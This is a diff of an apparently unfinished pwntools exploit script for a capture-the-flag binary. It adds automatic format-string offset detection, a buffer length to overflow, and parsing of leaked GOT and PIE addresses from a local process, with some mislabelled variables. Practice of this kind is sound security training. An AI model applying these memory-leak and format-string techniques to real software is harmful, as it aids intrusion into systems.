@@ -36,7 +36,7 @@ context.log_level = "debug"
 
 def progEnv():
     libc = ELF('/usr/lib64/ld-linux-x86-64.so.2')      # Use local libc library
-    return process(elf.path)                # Start a process to use
+    return process(elf.path)                # Start a process to use ----> Used and can be stored in a variable
     '''     COMMENTED OUT FOR NOW TO TEST LOCALLY
     if args.LOCAL:
         libc = ELF('/usr/lib/libc-2.33.so', checksec=False)
@@ -53,8 +53,32 @@ def exec_fmt(payload):
     return p.recvall()
 
 def main():
-    print("hello!")
-    test = progEnv()
+    # Determine format string offset automatically --- pulled from CTF writeup, but prevents me from having to find the exact format
+    autofmt = FmtStr(exec_fmt)
+    offset = autofmt.offset
+    # log.info(f'Format string offset: {offset}')
+
+    # start process
+    runningProc = progEnv()
+
+    # Buffer length to smash, found in C code
+    buffer = 0x150
+
+    ##################################################
+    #####               LEAK TIME                #####
+    ##################################################
+
+    # Pull leak info for GOT leak
+    runningProc.recvuntil(b"This stack leak might be useful ")  # Used to differentiate the two leaks sinec both have similar wording
+    GOTLeak = runningProc.recvuntil(b"\n")
+    print("GOT LEAK: ", GOTLeak)        # Leak value check
+    GOTLeakInt = int(GOTLeak, 16)
+
+    # Pull leak info for Main leak
+    runningProc.recvuntil(b"And this PIE leak might be useful ")
+    PIELeak = runningProc.recvuntil(b"\n")
+    print("PIE LEAK: ", PIELeak)        # Leak value check
+    PIELeakInt = int(PIELeak, 16)
 
 # Execute the function main when written
 if __name__ == "__main__":
